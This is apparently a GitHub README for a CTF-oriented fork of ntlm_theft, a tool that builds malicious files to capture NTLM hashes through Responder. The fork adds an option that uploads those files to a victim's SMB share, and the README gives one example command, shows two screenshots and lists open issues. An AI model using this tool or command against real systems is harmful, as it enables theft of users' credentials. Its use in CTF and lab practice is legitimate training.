This is a fork of [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) A tool to generate malicious files to steal ntlm hashes using responder. 
I have added an optional CTF arg (not realistic for realworld i don't think). This `upload` argument will take all the files generated byt ntlm_theft
and upload them to the victim defined by rserver andd rport


`python3 ntlm_theft.py --generate all --server 127.0.0.1 --filename 'desktop' --upload -rserver localhost -rport 445 -smbuser guest -smbpass '' -d ./desktop/`


![image](https://github.com/h8handles/ntlm_theftCTF/assets/67421443/20ef3a48-7994-45fe-bce5-054a4946487b)


After normal generation of the malicious files it will take the directory created and upload the files 


_List of files Uploaded_

![image](https://github.com/h8handles/ntlm_theftCTF/assets/67421443/6017db00-5cf7-4d65-a2c5-4964d1c40ae3)


## Issues

- need a way to handle netbios name not hardcode
- having issues working remotely but local concept works
- very ugly :D

  

